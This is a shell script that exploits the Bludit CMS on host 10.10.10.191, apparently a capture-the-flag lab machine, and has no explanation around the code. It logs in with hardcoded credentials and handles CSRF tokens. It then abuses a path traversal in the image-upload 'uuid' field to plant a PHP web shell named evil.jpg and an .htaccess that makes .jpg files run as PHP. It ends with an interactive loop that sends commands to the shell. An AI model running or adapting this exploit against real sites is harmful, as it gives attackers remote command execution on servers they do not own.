#!/bin/sh

# get cookie and csrf token
curl -v 'http://10.10.10.191/admin/' > /tmp/bludit-request 2>&1 
cookie=$(cat /tmp/bludit-request | grep 'Set-Cookie' | sed -nr 's/^.*BLUDIT-KEY=(.+); path.*$/\1/p')
csrf_token=$(cat /tmp/bludit-request | grep 'jstokenCSRF' | sed -nr 's/^.*value="(.*)">$/\1/p')

# login
curl --silent 'http://10.10.10.191/admin/login' -H "Cookie: BLUDIT-KEY=${cookie}" --data "tokenCSRF=${csrf_token}&username=fergus&password=RolandDeschain&save=" >/dev/null

# create evil.jpg
echo '<?php system($_GET[1]); ?>' > /tmp/evil.jpg

# create .htaccess file
echo "RewriteEngine off
AddType application/x-httpd-php .jpg" > /tmp/.htaccess

# get new csrf token
csrf_token=$(curl --silent 'http://10.10.10.191/admin/new-content' -H "Cookie: BLUDIT-KEY=${cookie}" | grep "var tokenCSRF = " | sed -nr 's/.*= "(.*)";/\1/p')

# upload evil.jpg
curl --silent -F "images[]=@/tmp/evil.jpg" 'http://10.10.10.191/admin/ajax/upload-images' -H "Cookie: BLUDIT-KEY=${cookie}" -F "uuid=../../tmp/evil" -F "tokenCSRF=${csrf_token}" > /dev/null

# and another csrf token
csrf_token=$(curl --silent 'http://10.10.10.191/admin/new-content' -H "Cookie: BLUDIT-KEY=${cookie}" | grep "var tokenCSRF = " | sed -nr 's/.*= "(.*)";/\1/p')

# upload .htaccess to tmp folder
curl --silent -F "images[]=@/tmp/.htaccess" 'http://10.10.10.191/admin/ajax/upload-images' -H "Cookie: BLUDIT-KEY=${cookie}" -F "uuid=blah-blah-blah" -F "tokenCSRF=${csrf_token}" > /dev/null

# Run commands on the new web shell
while true;do
 echo -n "$ "; read cmd
 curl --silent -G "http://10.10.10.191/bl-content/tmp/evil/evil.jpg" --data-urlencode "1=${cmd}"
done